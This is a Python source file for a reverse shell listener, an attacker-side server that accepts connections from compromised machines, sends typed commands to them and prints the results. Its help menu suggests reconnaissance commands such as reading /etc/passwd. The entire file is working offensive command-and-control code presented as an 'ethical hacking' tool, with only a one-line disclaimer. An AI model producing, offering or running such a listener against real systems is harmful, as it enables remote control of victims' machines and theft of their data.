import socket
import sys
import threading
import argparse
from colorama import Fore, Style, init

init(autoreset=True)

class ReverseShellListener:
    """Server component that listens for reverse shell connections"""
    
    def __init__(self, host, port):
        """
        Initialize listener
        
        Args:
            host (str): Bind address (0.0.0.0 for all interfaces)
            port (int): Listen port
        """
        self.host = host
        self.port = port
        self.server_socket = None
        self.clients = []
        self.active_connection = None
    
    def create_server(self):
        """Create and bind server socket"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            print(f"{Fore.GREEN}[+] Server created successfully!")
            print(f"{Fore.GREEN}[+] Listening on {self.host}:{self.port}")
            print(f"{Fore.YELLOW}[!] Waiting for incoming connections...\n")
            
        except Exception as e:
            print(f"{Fore.RED}[-] Failed to create server: {str(e)}")
            sys.exit(1)
    
    def handle_client(self, client_socket, client_address):
        """
        Handle individual client connection
        
        Args:
            client_socket: Connected socket object
            client_address: Client's address tuple
        """
        print(f"{Fore.GREEN}[+] Connection from {client_address[0]}:{client_address[1]}")
        
        self.clients.append((client_socket, client_address))
        client_id = len(self.clients) - 1
        
        try:
            # Send welcome message
            welcome = f"\n{Fore.CYAN}=== Reverse Shell Connected ==={Style.RESET_ALL}\n"
            welcome += f"Client ID: {client_id}\n"
            welcome += f"From: {client_address[0]}:{client_address[1]}\n"
            welcome += f"Type 'help' for commands\n\n"
            
            print(f"{Fore.CYAN}{welcome}")
            
            while True:
                # Get command from user
                try:
                    command = input(f"{Fore.YELLOW}[Shell {client_id}]> {Style.RESET_ALL}").strip()
                except KeyboardInterrupt:
                    print(f"\n{Fore.YELLOW}[!] Disconnecting...")
                    break
                
                if not command:
                    continue
                
                # Handle special commands
                if command.lower() == "exit":
                    print(f"{Fore.YELLOW}[!] Closing connection...")
                    break
                
                if command.lower() == "help":
                    self.print_help()
                    continue
                
                if command.lower() == "clients":
                    self.list_clients()
                    continue
                
                # Send command to client
                try:
                    client_socket.sendall((command + "\n").encode())
                    
                    # Receive output
                    output = b""
                    while True:
                        try:
                            chunk = client_socket.recv(4096)
                            if not chunk:
                                break
                            output += chunk
                            
                            # Check if we have complete output
                            # (shell commands typically end with prompt or newline)
                            if output.endswith(b"\n") or b"command not found" in output:
                                break
                                
                        except socket.timeout:
                            break
                    
                    if output:
                        print(f"{Fore.GREEN}{output.decode('utf-8', errors='ignore')}{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.CYAN}(no output)")
                
                except Exception as e:
                    print(f"{Fore.RED}[-] Error sending command: {str(e)}")
                    break
        
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}")
        
        finally:
            client_socket.close()
            self.clients.remove((client_socket, client_address))
            print(f"{Fore.YELLOW}[!] Client {client_id} disconnected")
    
    def accept_connections(self):
        """Accept incoming client connections"""
        try:
            while True:
                client_socket, client_address = self.server_socket.accept()
                client_socket.settimeout(10)  # Set timeout for recv operations
                
                # Handle each client in a separate thread
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, client_address),
                    daemon=True
                )
                client_thread.start()
        
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Shutting down server...")
        
        except Exception as e:
            print(f"{Fore.RED}[-] Error accepting connections: {str(e)}")
        
        finally:
            self.shutdown()
    
    def shutdown(self):
        """Close all connections and shut down server"""
        print(f"{Fore.CYAN}[*] Closing all connections...")
        
        for client_socket, client_address in self.clients:
            try:
                client_socket.close()
            except:
                pass
        
        if self.server_socket:
            self.server_socket.close()
        
        print(f"{Fore.GREEN}[+] Server shut down successfully")
    
    def print_help(self):
        """Print help menu"""
        help_text = f"""
{Fore.CYAN}=== Available Commands ==={Style.RESET_ALL}
  help      - Display this help menu
  clients   - List connected clients
  exit      - Disconnect from current client
  
{Fore.CYAN}=== Shell Commands ==={Style.RESET_ALL}
  Any shell command can be executed on the remote system:
  - whoami              : Display current user
  - pwd                 : Print working directory
  - ls -la              : List files
  - cat /etc/passwd     : Read files
  - ifconfig            : Display network interfaces
  - netstat -tulpn      : Display network connections
"""
        print(help_text)
    
    def list_clients(self):
        """List all connected clients"""
        if not self.clients:
            print(f"{Fore.YELLOW}[!] No connected clients")
            return
        
        print(f"\n{Fore.CYAN}=== Connected Clients ==={Style.RESET_ALL}")
        for i, (_, addr) in enumerate(self.clients):
            print(f"  Client {i}: {addr[0]}:{addr[1]}")
        print()
    
    def start(self):
        """Start the listener"""
        self.create_server()
        self.accept_connections()


def main():
    parser = argparse.ArgumentParser(
        description="Reverse Shell Listener - Ethical Hacking Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 listener.py -l 0.0.0.0 -p 4444
  python3 listener.py -l 192.168.1.4 -p 8888
        """
    )
    
    parser.add_argument("-l", "--lhost", default="0.0.0.0", 
                       help="Listen host (default: 0.0.0.0)")
    parser.add_argument("-p", "--lport", type=int, default=4444,
                       help="Listen port (default: 4444)")
    
    args = parser.parse_args()
    
    print(f"""
{Fore.CYAN}╔══════════════════════════════════════╗
║   Reverse Shell Listener (Server)      ║
║   Educational & Authorized Use Only    ║
╚══════════════════════════════════════╝{Style.RESET_ALL}
    """)
    
    listener = ReverseShellListener(args.lhost, args.lport)
    listener.start()


if __name__ == "__main__":
    main()